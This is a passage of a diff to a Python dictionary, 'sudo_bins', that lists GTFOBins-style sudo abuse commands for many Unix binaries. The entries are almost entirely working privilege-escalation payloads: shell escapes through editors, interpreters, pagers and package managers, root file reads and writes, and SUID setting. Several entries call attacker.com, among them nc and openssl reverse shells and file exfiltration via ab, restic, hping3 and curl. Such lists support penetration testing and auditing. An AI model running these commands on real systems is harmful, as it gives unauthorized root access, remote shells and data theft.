         "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n",
         "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
         "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n"
     ],
-    "nl": [
-        "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"
+    "debugfs": [
+        "sudo debugfs\n!/bin/sh\n"
     ],
-    "yarn": [
-        "sudo yarn exec /bin/sh"
+    "ptx": [
+        "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\"\n"
     ],
-    "rview": [
-        "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
-        "sudo rview -c ':lua os.execute(\"reset; exec sh\")'"
+    "logsave": [
+        "sudo logsave /dev/null /bin/sh -i"
     ],
-    "tcpdump": [
-        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
+    "strace": [
+        "sudo strace -o /dev/null /bin/sh"
     ],
-    "alpine": [
-        "LFILE=file_to_read\nsudo alpine -F \"$LFILE\"\n"
-    ],
-    "file": [
-        "LFILE=file_to_read\nsudo file -f $LFILE\n"
-    ],
-    "dig": [
-        "LFILE=file_to_read\nsudo dig -f $LFILE\n"
-    ],
-    "pdftex": [
-        "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
-    ],
-    "xetex": [
-        "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
-    ],
-    "gawk": [
-        "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
-    ],
-    "xargs": [
-        "sudo xargs -a /dev/null sh"
-    ],
-    "expand": [
-        "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"
-    ],
-    "nsenter": [
-        "sudo nsenter /bin/sh"
-    ],
-    "strings": [
-        "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"
-    ],
-    "restic": [
-        "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
-    ],
-    "setfacl": [
-        "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n"
-    ],
-    "xxd": [
-        "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
-    ],
-    "cowthink": [
-        "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
-    ],
-    "efax": [
-        "LFILE=file_to_read\nsudo efax -d \"$LFILE\"\n"
-    ],
-    "eqn": [
-        "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"
-    ],
-    "tasksh": [
-        "sudo tasksh\n!/bin/sh\n"
-    ],
-    "byebug": [
-        "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
-    ],
-    "fish": [
-        "sudo fish"
+    "ssh-agent": [
+        "sudo ssh-agent /bin/"
     ],
     "ksh": [
         "sudo ksh"
     ],
-    "scp": [
-        "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
+    "posh": [
+        "sudo posh"
     ],
-    "ld.so": [
-        "sudo /lib/ld.so /bin/sh"
+    "dmidecode": [
+        "LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\"\n"
     ],
-    "dotnet": [
-        "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
+    "composer": [
+        "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"
     ],
-    "atobm": [
-        "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
+    "ab": [
+        "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n"
     ],
-    "check_raid": [
-        "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"
+    "base64": [
+        "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n"
     ],
-    "octave": [
-        "sudo octave-cli --eval 'system(\"/bin/sh\")'"
-    ],
-    "ftp": [
-        "sudo ftp\n!/bin/sh\n"
-    ],
-    "virsh": [
-        "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n"
-    ],
-    "date": [
-        "LFILE=file_to_read\nsudo date -f $LFILE\n"
-    ],
-    "mosquitto": [
-        "LFILE=file_to_read\nsudo mosquitto -c \"$LFILE\"\n"
-    ],
-    "opkg": [
-        "sudo opkg install x_1.0_all.deb\n"
-    ],
-    "tac": [
-        "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"
-    ],
-    "wget": [
-        "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0\n"
-    ],
-    "run-mailcap": [
-        "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n"
-    ],
-    "start-stop-daemon": [
-        "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
-    ],
-    "psftp": [
-        "sudo psftp\n!/bin/sh\n"
-    ],
-    "mysql": [
-        "sudo mysql -e '\\! /bin/sh'"
-    ],
-    "fping": [
-        "LFILE=file_to_read\nsudo fping -f $LFILE\n"
-    ],
-    "whiptail": [
-        "LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
-    ],
-    "gcore": [
-        "sudo gcore $PID"
-    ],
-    "check_ssl_cert": [
-        "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"
-    ],
-    "aspell": [
-        "LFILE=file_to_read\nsudo aspell -c \"$LFILE\"\n"
+    "perl": [
+        "sudo perl -e 'exec \"/bin/sh\";'"
     ],
     "torify": [
         "sudo torify /bin/sh"
     ],
-    "kubectl": [
-        "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
+    "msguniq": [
+        "LFILE=file_to_read\nsudo msguniq -P $LFILE\n"
     ],
-    "column": [
-        "LFILE=file_to_read\nsudo column $LFILE\n"
+    "latex": [
+        "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
+        "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
     ],
-    "pkexec": [
-        "sudo pkexec /bin/sh"
+    "paste": [
+        "LFILE=file_to_read\nsudo paste $LFILE\n"
     ],
-    "nc": [
-        "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n"
+    "scp": [
+        "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
+    ],
+    "ruby": [
+        "sudo ruby -e 'exec \"/bin/sh\"'"
+    ],
+    "xmore": [
+        "LFILE=file_to_read\nsudo xmore $LFILE\n"
+    ],
+    "batcat": [
+        "sudo batcat --paging always /etc/profile\n!/bin/sh\n"
+    ],
+    "tcpdump": [
+        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
+    ],
+    "gimp": [
+        "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
+    ],
+    "expand": [
+        "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"
+    ],
+    "distcc": [
+        "sudo distcc /bin/sh"
+    ],
+    "perf": [
+        "sudo perf stat /bin/sh\n"
+    ],
+    "screen": [
+        "sudo screen"
+    ],
+    "dialog": [
+        "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"
+    ],
+    "chroot": [
+        "sudo chroot /\n"
+    ],
+    "dash": [
+        "sudo dash"
+    ],
+    "uniq": [
+        "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"
+    ],
+    "mv": [
+        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"
     ],
     "lftp": [
         "sudo lftp -c '!/bin/sh'"
     ],
-    "gtester": [
-        "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
+    "alpine": [
+        "LFILE=file_to_read\nsudo alpine -F \"$LFILE\"\n"
     ],
-    "fold": [
-        "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"
+    "tex": [
+        "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n"
     ],
-    "less": [
-        "sudo less /etc/profile\n!/bin/sh\n"
+    "at": [
+        "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"
     ],
-    "jrunscript": [
-        "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
+    "ltrace": [
+        "sudo ltrace -b -L /bin/sh"
     ],
-    "run-parts": [
-        "sudo run-parts --new-session --regex '^sh$' /bin"
+    "smbclient": [
+        "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
     ],
-    "rvim": [
-        "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
-        "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"
+    "aria2c": [
+        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
     ],
-    "ascii85": [
-        "LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode\n"
+    "rc": [
+        "sudo rc -c '/bin/sh'"
     ],
-    "uudecode": [
-        "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
+    "xdotool": [
+        "sudo xdotool exec --sync /bin/sh"
     ],
-    "ssh": [
-        "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
+    "dosbox": [
+        "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
     ],
-    "sftp": [
-        "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"
+    "dstat": [
+        "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n"
     ],
-    "sysctl": [
-        "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
+    "ghc": [
+        "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
     ],
-    "csvtool": [
-        "sudo csvtool call '/bin/sh;false' /etc/passwd"
+    "joe": [
+        "sudo joe\n^K!/bin/sh\n"
     ],
-    "pip": [
-        "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"
+    "crash": [
+        "sudo crash -h\n!sh\n"
     ],
-    "node": [
-        "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
+    "look": [
+        "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"
     ],
-    "php": [
-        "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
+    "tclsh": [
+        "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
     ],
-    "ksu": [
-        "sudo ksu -q -e /bin/sh"
+    "w3m": [
+        "LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump\n"
     ],
-    "watch": [
-        "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
+    "ssh-keyscan": [
+        "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
     ],
-    "rpm": [
-        "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
-        "sudo rpm -ivh x-1.0-1.noarch.rpm\n"
+    "nl": [
+        "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"
     ],
-    "install": [
-        "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
+    "capsh": [
+        "sudo capsh --"
+    ],
+    "wireshark": [
+        "PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\"\n"
+    ],
+    "apt": [
+        "sudo apt changelog apt\n!/bin/sh\n",
+        "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n",
+        "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
+    ],
+    "head": [
+        "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
+    ],
+    "hexdump": [
+        "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"
+    ],
+    "soelim": [
+        "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"
     ],
     "zathura": [
         "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n"
     ],
-    "rlwrap": [
-        "sudo rlwrap /bin/sh"
+    "expect": [
+        "sudo expect -c 'spawn /bin/sh;interact'"
     ],
-    "basenc": [
-        "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"
+    "julia": [
+        "sudo julia -e 'run(`/bin/sh`)'\n"
     ],
-    "mount": [
-        "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n"
+    "wall": [
+        "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\"\n"
     ],
-    "highlight": [
-        "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"
+    "od": [
+        "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"
     ],
-    "timedatectl": [
-        "sudo timedatectl list-timezones\n!/bin/sh\n"
+    "minicom": [
+        "sudo minicom -D /dev/null\n"
     ],
-    "dmsetup": [
-        "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
+    "msfconsole": [
+        "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
     ],
-    "ansible-playbook": [
-        "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n"
+    "script": [
+        "sudo script -q /dev/null"
+    ],
+    "rpm": [
+        "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
+        "sudo rpm -ivh x-1.0-1.noarch.rpm\n"
     ],
     "xz": [
         "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n"
@@ -532,627 +815,105 @@ sudo_bins={
     "ex": [
         "sudo ex\n!/bin/sh\n"
     ],
-    "jtag": [
-        "sudo jtag --interactive\nshell /bin/sh\n"
-    ],
-    "stdbuf": [
-        "sudo stdbuf -i0 /bin/sh"
-    ],
-    "latex": [
-        "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
-        "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
-    ],
-    "julia": [
-        "sudo julia -e 'run(`/bin/sh`)'\n"
-    ],
-    "hexdump": [
-        "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"
-    ],
-    "ed": [
-        "sudo ed\n!/bin/sh\n"
-    ],
-    "paste": [
-        "LFILE=file_to_read\nsudo paste $LFILE\n"
-    ],
-    "msgconv": [
-        "LFILE=file_to_read\nsudo msgconv -P $LFILE\n"
-    ],
-    "multitime": [
-        "sudo multitime /bin/sh"
-    ],
-    "script": [
-        "sudo script -q /dev/null"
-    ],
-    "check_log": [
-        "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"
-    ],
-    "base32": [
-        "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"
-    ],
-    "gem": [
-        "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
-    ],
-    "certbot": [
-        "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"
-    ],
-    "jjs": [
-        "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
-    ],
-    "xmore": [
-        "LFILE=file_to_read\nsudo xmore $LFILE\n"
-    ],
-    "xdotool": [
-        "sudo xdotool exec --sync /bin/sh"
-    ],
-    "setarch": [
-        "sudo setarch $(arch) /bin/sh"
-    ],
-    "ispell": [
-        "sudo ispell /etc/passwd\n!/bin/sh\n"
-    ],
-    "dd": [
-        "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"
-    ],
-    "sqlite3": [
-        "sudo sqlite3 /dev/null '.shell /bin/sh'"
-    ],
-    "dosbox": [
-        "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
-    ],
-    "tic": [
-        "LFILE=file_to_read\nsudo tic -C \"$LFILE\"\n"
-    ],
-    "ltrace": [
-        "sudo ltrace -b -L /bin/sh"
-    ],
-    "7z": [
-        "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n"
-    ],
-    "rc": [
-        "sudo rc -c '/bin/sh'"
-    ],
-    "bpftrace": [
-        "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'",
-        "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n",
-        "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
-    ],
-    "tmate": [
-        "sudo tmate -c /bin/sh"
-    ],
-    "xpad": [
-        "LFILE=file_to_read\nsudo xpad -f \"$LFILE\"\n"
-    ],
-    "dmesg": [
-        "sudo dmesg -H\n!/bin/sh\n"
-    ],
-    "crash": [
-        "sudo crash -h\n!sh\n"
-    ],
-    "pidstat": [
-        "COMMAND=id\nsudo pidstat -e $COMMAND\n"
-    ],
-    "easy_install": [
-        "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
-    ],
-    "env": [
-        "sudo env /bin/sh"
-    ],
-    "bconsole": [
-        "sudo bconsole\n@exec /bin/sh\n"
-    ],
-    "base64": [
-        "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n"
-    ],
-    "terraform": [
-        "sudo terraform console\nfile(\"file_to_read\")\n"
-    ],
-    "zypper": [
-        "sudo zypper x\n",
-        "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
-    ],
-    "aoss": [
-        "sudo aoss /bin/sh"
-    ],
-    "curl": [
-        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n"
-    ],
-    "ncftp": [
-        "sudo ncftp\n!/bin/sh\n"
-    ],
-    "ab": [
-        "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n"
-    ],
-    "systemd-resolve": [
-        "sudo systemd-resolve --status\n!sh\n"
-    ],
-    "hd": [
-        "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"
-    ],
-    "xelatex": [
-        "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
-        "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
-    ],
-    "nroff": [
-        "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
-    ],
-    "pg": [
-        "sudo pg /etc/profile\n!/bin/sh\n"
-    ],
-    "msgmerge": [
-        "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n"
-    ],
-    "cabal": [
-        "sudo cabal exec -- /bin/sh"
-    ],
-    "tdbtool": [
-        "sudo tdbtool\n! /bin/sh\n"
-    ],
-    "zsoelim": [
-        "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"
-    ],
-    "cowsay": [
-        "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
-    ],
-    "dialog": [
-        "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"
-    ],
-    "uuencode": [
-        "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
-    ],
-    "comm": [
-        "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"
-    ],
-    "chmod": [
-        "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"
-    ],
-    "ssh-agent": [
-        "sudo ssh-agent /bin/"
-    ],
-    "mawk": [
-        "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
-    ],
-    "rev": [
-        "LFILE=file_to_read\nsudo rev $LFILE | rev\n"
-    ],
-    "msfconsole": [
-        "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
-    ],
-    "tex": [
-        "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n"
-    ],
-    "pwsh": [
-        "sudo pwsh"
-    ],
-    "espeak": [
-        "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\"\n"
-    ],
-    "wish": [
-        "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
-    ],
-    "sg": [
-        "sudo sg root\n"
-    ],
-    "nohup": [
-        "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
-    ],
-    "telnet": [
-        "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n"
-    ],
-    "bundle": [
-        "sudo bundle help\n!/bin/sh\n"
-    ],
-    "od": [
-        "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"
-    ],
-    "time": [
-        "sudo /usr/bin/time /bin/sh"
-    ],
-    "bundler": [
-        "sudo bundler help\n!/bin/sh\n"
-    ],
-    "scrot": [
-        "sudo scrot -e /bin/sh"
-    ],
-    "perf": [
-        "sudo perf stat /bin/sh\n"
-    ],
-    "rsync": [
-        "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
-    ],
-    "dmidecode": [
-        "LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\"\n"
-    ],
-    "mail": [
-        "sudo mail --exec='!/bin/sh'"
-    ],
-    "logsave": [
-        "sudo logsave /dev/null /bin/sh -i"
-    ],
-    "screen": [
-        "sudo screen"
-    ],
-    "bc": [
-        "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n"
-    ],
-    "lua": [
-        "sudo lua -e 'os.execute(\"/bin/sh\")'"
-    ],
-    "msgattrib": [
-        "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n"
-    ],
-    "busctl": [
-        "sudo busctl --show-machine\n!/bin/sh\n"
-    ],
-    "csplit": [
-        "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
-    ],
-    "tee": [
-        "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"
-    ],
-    "iftop": [
-        "sudo iftop\n!/bin/sh\n"
-    ],
-    "wc": [
-        "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n"
-    ],
-    "eb": [
-        "sudo eb logs\n!/bin/sh\n"
-    ],
-    "elvish": [
-        "sudo elvish"
-    ],
-    "xdg-user-dir": [
-        "sudo xdg-user-dir '}; /bin/sh #'\n"
-    ],
-    "troff": [
-        "LFILE=file_to_read\nsudo troff $LFILE\n"
-    ],
-    "setlock": [
-        "sudo setlock - /bin/sh"
-    ],
-    "git": [
-        "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
-        "sudo git -p help config\n!/bin/sh\n",
-        "sudo git branch --help config\n!/bin/sh\n",
-        "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n",
-        "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
-    ],
-    "fmt": [
-        "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n"
-    ],
-    "clamscan": [
-        "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
-    ],
-    "loginctl": [
-        "sudo loginctl user-status\n!/bin/sh\n"
-    ],
-    "tail": [
-        "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"
-    ],
-    "rpmverify": [
-        "sudo rpmverify --eval '%(/bin/sh 1>&2)'"
-    ],
-    "msgfilter": [
-        "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n"
-    ],
-    "expect": [
-        "sudo expect -c 'spawn /bin/sh;interact'"
-    ],
-    "openssl": [
-        "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
-    ],
-    "unexpand": [
-        "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
-    ],
-    "scanmem": [
-        "sudo scanmem\nshell /bin/sh\n"
-    ],
-    "smbclient": [
-        "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
-    ],
-    "task": [
-        "sudo task execute /bin/sh"
-    ],
-    "knife": [
-        "sudo knife exec -E 'exec \"/bin/sh\"'\n"
-    ],
-    "debugfs": [
-        "sudo debugfs\n!/bin/sh\n"
-    ],
-    "service": [
-        "sudo service ../../bin/sh"
-    ],
-    "check_by_ssh": [
-        "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
-    ],
-    "cdist": [
-        "sudo cdist shell -s /bin/sh"
-    ],
-    "genie": [
-        "sudo genie -c '/bin/sh'"
-    ],
-    "gzip": [
-        "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"
-    ],
-    "posh": [
-        "sudo posh"
-    ],
-    "dpkg": [
-        "sudo dpkg -l\n!/bin/sh\n",
-        "sudo dpkg -i x_1.0_all.deb"
-    ],
-    "iconv": [
-        "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
-    ],
-    "grep": [
-        "LFILE=file_to_read\nsudo grep '' $LFILE\n"
-    ],
-    "hping3": [
-        "sudo hping3\n/bin/sh\n",
-        "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"\n"
-    ],
-    "irb": [
-        "sudo irb\nexec '/bin/bash'\n"
-    ],
-    "apt-get": [
-        "sudo apt-get changelog apt\n!/bin/sh\n",
-        "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n",
-        "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
-    ],
-    "cpan": [
-        "sudo cpan\n! exec '/bin/bash'\n"
-    ],
-    "distcc": [
-        "sudo distcc /bin/sh"
-    ],
-    "batcat": [
-        "sudo batcat --paging always /etc/profile\n!/bin/sh\n"
-    ],
-    "strace": [
-        "sudo strace -o /dev/null /bin/sh"
-    ],
-    "redcarpet": [
-        "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"
-    ],
-    "ruby": [
-        "sudo ruby -e 'exec \"/bin/sh\"'"
-    ],
-    "csh": [
-        "sudo csh"
-    ],
-    "ul": [
-        "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"
-    ],
-    "genisoimage": [
-        "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"
-    ],
-    "facter": [
